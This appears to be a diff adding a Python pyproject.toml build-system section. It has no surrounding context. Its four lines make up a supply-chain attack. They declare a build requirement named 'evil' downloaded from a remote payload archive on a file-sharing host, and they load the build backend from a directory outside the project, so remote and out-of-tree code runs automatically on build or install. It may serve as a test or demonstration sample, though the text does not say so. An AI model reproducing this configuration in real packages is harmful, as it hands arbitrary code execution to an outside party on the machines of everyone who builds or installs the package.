@@ -1,0 +1,4 @@
+[build-system]
+requires = ["setuptools", "evil @ https://gofile.io/d/payload.tar.gz"]
+build-backend = "local_backend"
+backend-path = ["../shared"]
